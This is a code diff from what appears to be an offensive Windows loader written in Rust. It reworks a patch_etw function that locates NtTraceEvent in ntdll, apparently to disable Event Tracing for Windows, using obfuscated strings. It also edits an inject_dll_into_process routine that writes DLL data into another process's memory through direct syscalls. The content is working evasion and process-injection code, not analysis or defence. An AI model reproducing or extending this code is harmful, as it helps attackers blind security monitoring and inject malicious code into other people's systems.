@@ -1,4 +1,3 @@
-use std::str::Bytes;
 use std::ffi::c_void;
 use std::thread;
 use std::time::Duration;
@@ -7,6 +6,8 @@ use std::ptr::addr_of_mut;
 use anyhow::Ok;
 
 use crate::nt_api::*;
+use crate::parse_pe::PeModuleParser;
+use crate::parse_pe::get_module_handle;
 
 use ntapi::{
     ntobapi::NtClose,
@@ -36,9 +37,6 @@ use winapi::{
     um::processthreadsapi::{GetCurrentProcess}
 };
 
-use export_resolver::ExportList;
-
-
 
 use obfuse::obfuse;
 
@@ -54,10 +52,14 @@ pub fn patch_etw() -> Result<(), anyhow::Error>
     let obfused_nt_trace_event = obfuse!("NtTraceEvent\0");
     let nt_trace_event_str = obfused_nt_trace_event.as_str();
 
-    let mut exports = ExportList::new();
-    exports.add(ntdll_str, nt_trace_event_str).expect("[ERROR] Finding address of NTTE.");
+    // exports.add(ntdll_str, nt_trace_event_str).expect("[ERROR] Finding address of NTTE.");
 
-    let nt_trace_addr = exports.get_function_address(nt_trace_event_str).expect("[ERROR] Unable to retrieve address of NTTE.") as * const c_void;
+    // let nt_trace_addr = exports.get_function_address(nt_trace_event_str).expect("[ERROR] Unable to retrieve address of NTTE.") as * const c_void;
+    
+    let ntdll_ptr = unsafe { get_module_handle(ntdll_str) };
+    let parser = PeModuleParser::new(ntdll_ptr);
+    let Some(nt_trace_addr) = parser.get_func_addr(nt_trace_event_str) else { anyhow::bail!("[ERROR] Failed to find address of NTTE. ")};
+
     let handle = unsafe {
         GetCurrentProcess()
     };
@@ -143,9 +145,9 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
     {
 
 
-        for _i in 1..=5 {
-            thread::sleep(Duration::from_secs(1));
-        }
+        // for _i in 1..=5 {
+        //     thread::sleep(Duration::from_secs(1));
+        // }
 
         let mut process_handle: HANDLE = null_mut();
         let client_id = CLIENT_ID {
@@ -177,7 +179,7 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
             return Err(anyhow::anyhow!("[ERROR] Failed to open proc: 0x{:X}.", status));
         }
 
-        let dll_data = &rf_dll.data;
+        let dll_data = rf_dll.data;
         let base_address: *mut c_void  = null_mut();
         let mut region_size: SIZE_T = dll_data.len() as SIZE_T;
 
@@ -206,9 +208,9 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, 
 
         let status = zw_write_virtual_memory(
             process_handle, 
-            base_address as *mut c_void, 
+            base_address, 
             dll_data.as_ptr() as *const c_void as *mut c_void, 
-            dll_data.len() as usize, 
+            dll_data.len(), 
             &mut bytes_written, 
             NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].ssn, 
             NT_SSN[NtIndex::ZwWriteVirtualMemory as usize].syscall_ret
